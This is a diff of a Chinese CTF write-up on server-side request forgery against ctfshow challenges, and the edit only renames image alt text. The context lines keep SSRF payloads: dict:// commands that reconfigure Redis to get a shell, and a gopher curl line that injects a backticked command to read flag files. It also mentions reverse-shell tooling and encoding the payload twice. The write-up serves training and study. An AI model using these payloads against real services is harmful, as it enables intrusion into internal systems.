@@ -47,11 +47,11 @@ curl_close($ch);
 
 ![s](./assets/001.jpg)
 
-![1](./assets/002.jpg)
+![image](./assets/002.jpg)
 
 即使有乱码，也能知道是有这个服务存在的，正当我想要测试远程的时候以ctfshowweb359为例子来进行测试的时候发现失败了，不能成功，不过又来测试ctfshowweb360的时候发现成功了
 
-![1](./assets/003.jpg)
+![image](./assets/003.jpg)
 
 ```
 url=dict://127.0.0.1:6379/CONFIG:SET:requirepass:ctfshow
@@ -75,7 +75,7 @@ url=dict://127.0.0.1:6379/save
 
 成功getshell
 
-![1](./assets/004.jpg)
+![image](./assets/004.jpg)
 
 也就是说这个东西可以当ssrf的ping，或者是redis-cli
 
@@ -96,7 +96,7 @@ gopher://<server>:<port>/<prefix><encoded_data>
 curl gopher://localhost:80/_`cat /f* > 1.txt`
 ```
 
-![1](./assets/005.jpg)
+![image](./assets/005.jpg)
 
 这个协议能够完美的解决`dict`协议只能执行一条命令导致无法攻击授权应用的短板，使用的方法可具体参考[ssrf打通内网靶场](https://baozongwi.xyz/2025/04/02/%E5%9B%BD%E5%85%89%E9%9D%B6%E5%9C%BAssrf%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91/)，讲不清楚，但是你一看就明白
 
@@ -111,9 +111,9 @@ sudo ./install.sh
 
 在这之前要有python2的pip才能够完美的安装，工具的基本针对的都是未授权服务，并且反弹shell的服务是修改不了端口的(我没找到)，但是对于sql这种手写比较麻烦的确实工具不错
 
-![1](./assets/006.jpg)
+![image](./assets/006.jpg)
 
-![1](./assets/007.jpg)
+![image](./assets/007.jpg)
 
 把payload部分进行二次编码即可
 
